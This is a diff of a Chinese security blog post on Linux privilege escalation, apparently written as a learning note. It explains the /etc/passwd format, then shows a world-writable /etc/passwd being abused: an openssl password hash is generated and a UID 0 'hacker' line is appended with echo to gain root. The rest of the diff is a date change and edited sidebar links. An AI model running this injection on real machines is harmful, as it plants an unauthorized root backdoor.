@@ -152,8 +152,8 @@ N1V = 学习·记录·碎碎念·电子墓碑</title>
 <figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#/etc/passwd 文件的每一行代表一个用户账户，每一行包含七个以冒号 (:) 分隔的字段，格式如下：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token symbol">username</span><span class="token symbol">:password</span><span class="token operator">:</span><span class="token constant">UID</span><span class="token symbol">:GID</span><span class="token operator">:</span><span class="token constant">GECOS</span><span class="token symbol">:home_directory</span><span class="token operator">:</span>shell</pre></td></tr></table></figure><blockquote>
 <p><strong>username</strong>: 用户名。系统中唯一标识一个用户的名称，例如  <code>root</code> 、 <code>john</code> 。</p>
 <p><strong>password</strong>: 用户的加密密码。在现代系统中，这个字段通常只包含一个  <code>x</code> ，表示实际的密码存储在  <code>/etc/shadow</code>  文件中。</p>
-<p><strong>UID (User ID)</strong>: 用户 ID。每个用户都有一个唯一的用户 ID，例如 0 表示超级用户  <code>root</code> 。</p>
-<p><strong>GID (Group ID)</strong>: 组 ID。用户所属的组 ID。系统会在  <code>/etc/group</code>  文件中查找这个 GID 对应的组名。</p>
+<p><strong>UID</strong>: 用户 ID。每个用户都有一个唯一的用户 ID，例如 0 表示超级用户  <code>root</code> 。</p>
+<p><strong>GID</strong>: 组 ID。用户所属的组 ID。系统会在  <code>/etc/group</code>  文件中查找这个 GID 对应的组名。</p>
 <p><strong>GECOS (General Electric Comprehensive Operating System)</strong>: 通常包含用户的全名和其他信息，格式可以包括用户全名、办公室号码、电话号码等。这个字段可以是空的。</p>
 <p><strong>home_directory</strong>: 用户的主目录。当用户登录时，系统会将用户的工作目录设置为这个目录。</p>
 <p><strong>shell</strong>: 用户的登录 shell。当用户登录时，系统会启动这个 shell 进程。常见的 shell 有  <code>/bin/bash</code> 、 <code>/bin/sh</code> 、 <code>/bin/zsh</code>  等。</p>
@@ -193,9 +193,9 @@ N1V = 学习·记录·碎碎念·电子墓碑</title>
 <p>发现其他用户 (在这里是除了 root 和 root 组的用户) 可写，可添加一个拥有 root 的用户</p>
 <p>首先 <code>/etc/passwd</code>  的格式生成一个恶意用户 hacker</p>
 <p>通过 <code>openssl</code>  生成加密密码（密码为 hacker123）</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>openssl <span class="token function">passwd</span> hacker123</pre></td></tr><tr><td data-num="2"></td><td><pre>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> hacker123</pre></td></tr></table></figure><p><img data-src="image-20250114112347163.png" alt="image-20250114112347163"></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>openssl <span class="token function">passwd</span> hacker123</pre></td></tr><tr><td data-num="2"></td><td><pre>// 或 openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> hacker123</pre></td></tr></table></figure><p><img data-src="image-20250114112347163.png" alt="image-20250114112347163"></p>
 <p>根据格式构造语句</p>
-<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>hacker<span class="token symbol">:$1</span><span class="token variable">$D43eYIPF</span><span class="token variable">$EZPNTFTY9QniXu2</span><span class="token punctuation">.</span>BSAXa1<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token symbol">hacker</span><span class="token symbol">:$1</span><span class="token variable">$zsmp5dPt</span>$<span class="token number">2</span>Hl5Y9cm43e6OVLgzNHDl0<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure><p>将其输入到 <code>/etc/passwd</code></p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>hacker<span class="token symbol">:$1</span><span class="token variable">$D43eYIPF</span><span class="token variable">$EZPNTFTY9QniXu2</span><span class="token punctuation">.</span>BSAXa1<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure><p>将其输入到 <code>/etc/passwd</code></p>
 <figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'hacker:$1$D43eYIPF$EZPNTFTY9QniXu2.BSAXa1:0:0:root:/root:/bin/bash'</span> <span class="token operator">>></span> /etc/passwd</pre></td></tr></table></figure><p>再查看</p>
 <figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cat</span> /etc/passwd</pre></td></tr></table></figure><p><img data-src="image-20250114112359730.png" alt="image-20250114112359730"></p>
 <p>恶意用户已添加进来了，登录试试</p>
@@ -553,7 +553,7 @@ ld.so.preload:
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2025-01-17 00:14:53" itemprop="dateModified" datetime="2025-01-17T00:14:53+08:00">2025-01-17</time>
+    <time title="修改时间：2025-10-26 17:43:42" itemprop="dateModified" datetime="2025-10-26T17:43:42+08:00">2025-10-26</time>
   </span>
   <span id="2025/01/10/Linux权限提升/" class="item leancloud_visitors" data-flag-title="Linux权限提升" title="阅读次数">
       <span class="icon">
@@ -721,52 +721,7 @@ ld.so.preload:
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2025/06/19/%E3%80%8E%E6%9E%84%E5%BB%BALLM%E3%80%8FN-gram%E6%A8%A1%E5%9E%8B/" title="『构建LLM』N-gram模型">『构建LLM』N-gram模型</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2025/01/19/%E3%80%8Eweekly%E3%80%8F%E8%B0%88%E6%8A%BD%E8%B1%A1%E8%89%BA%E6%9C%AF%E4%B9%8B%E4%B8%81%E6%9B%B2/" title="谈抽象艺术之丁曲">谈抽象艺术之丁曲</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2024/12/29/%E3%80%8Eweekly%E3%80%8F2024%E6%9C%80%E5%90%8E%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="『weekly』2024最后一篇博客">『weekly』2024最后一篇博客</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2024/11/29/JsonWebToken-JWT-%E5%AE%89%E5%85%A8/" title="Json Web Token(JWT)安全">Json Web Token(JWT)安全</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2024/11/16/JavaScript%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="JavaScript代码审计">JavaScript代码审计</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2024/11/17/%E3%80%8Eweekly%E3%80%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99%E5%91%A8%E8%AE%B0/" title="『weekly』为什么写周记 关于朋友圈">『weekly』为什么写周记 关于朋友圈</a></span>
+    <span><a href="/2025/05/10/%E3%80%8E%E9%AA%91%E8%A1%8C%E5%B0%8F%E8%AE%B0%E3%80%8F%E6%B0%B4%E5%8F%A3%C2%B7%E5%8F%A4%E7%94%B0/" title="『骑行小记』水口·古田">『骑行小记』水口·古田</a></span>
   </li>
 
       
@@ -784,7 +739,25 @@ ld.so.preload:
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2024/11/15/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="文件读取利用姿势">文件读取利用姿势</a></span>
+    <span><a href="/2025/06/08/PortSwigger-LLMSecurity-Range/" title="postswigger-LLM安全靶场">postswigger-LLM安全靶场</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/16/JavaScript%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="JavaScript代码审计">JavaScript代码审计</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/07/02/%E3%80%8E%E7%A2%8E%E7%A2%8E%E5%BF%B5%E3%80%8F%E5%AE%89%E5%85%A8%E5%8C%BA/" title="『碎碎念』安全区">『碎碎念』安全区</a></span>
   </li>
 
       
@@ -802,7 +775,34 @@ ld.so.preload:
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2025/02/16/%E3%80%8Eweekly%E3%80%8F%E8%AF%BB%E4%BB%A3%E7%A0%81%E4%B9%8B%E5%A4%96%E7%9A%84%E8%BD%AF%E6%8A%80%E8%83%BD-%E6%83%85%E4%BA%BA%E8%8A%82%E7%9A%84%E7%9B%B4%E6%92%AD/" title="『weekly』读代码之外的软技能 情人节的直播">『weekly』读代码之外的软技能 情人节的直播</a></span>
+    <span><a href="/2025/01/07/xss%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="xss综合利用姿势">xss综合利用姿势</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/17/%E3%80%8Eweekly%E3%80%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99%E5%91%A8%E8%AE%B0/" title="『weekly』为什么写周记 关于朋友圈">『weekly』为什么写周记 关于朋友圈</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/03/16/%E3%80%8Eweekly%E3%80%8F%E5%8D%97%E6%98%8C%E4%B9%8B%E8%A1%8C/" title="『monthly』迟到的博客 &quot;try hard&quot; 南昌之行">『monthly』迟到的博客 "try hard" 南昌之行</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/06/19/%E3%80%8E%E6%9E%84%E5%BB%BALLM%E3%80%8FN-gram%E6%A8%A1%E5%9E%8B/" title="『构建LLM』N-gram模型">『构建LLM』N-gram模型</a></span>
   </li>
 
   </ul>
